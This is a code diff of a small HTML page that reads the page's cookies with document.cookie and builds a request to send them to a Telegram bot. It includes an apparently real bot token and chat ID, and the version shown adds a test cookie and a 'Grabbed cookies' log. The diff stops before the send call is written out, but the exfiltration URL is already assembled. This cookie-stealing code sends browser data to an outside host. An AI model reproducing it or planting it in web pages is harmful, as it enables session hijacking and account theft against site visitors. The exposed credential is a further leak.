@@ -5,15 +5,24 @@
   <title>Send Cookies to Telegram</title>
 </head>
 <body>
-  <button onclick="sendCookies()">Send Cookies to Telegram</button>
+  <button onclick="setAndSendCookies()">Set & Send Cookies to Telegram</button>
 
   <script>
-    async function sendCookies() {
-      const cookies = document.cookie;
+    function setAndSendCookies() {
+      // Set a test cookie (expires in 1 day)
+      document.cookie = "username=JohnDoe; path=/; max-age=86400";
 
-      const telegramBotToken = '7597541879:AAGlAMmsEL0rZLFqs5G2j0_mi2yr3k-_w4o'; // e.g. 123456789:ABCdefGhIjKlmNoPQRstuVwxYZ
-      const chatId = '1389313310'; // e.g. @yourchannelusername or numeric ID
-      const message = `Cookies: ${cookies}`;
+      // Wait briefly to ensure it's set, then send
+      setTimeout(sendCookiesToTelegram, 500);
+    }
+
+    async function sendCookiesToTelegram() {
+      const cookies = document.cookie;
+      console.log("Grabbed cookies:", cookies); // For debugging
+
+      const telegramBotToken = '7597541879:AAGlAMmsEL0rZLFqs5G2j0_mi2yr3k-_w4o';
+      const chatId = '1389313310';
+      const message = `Cookies: ${cookies || '[No readable cookies]'}`;
 
       const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
 
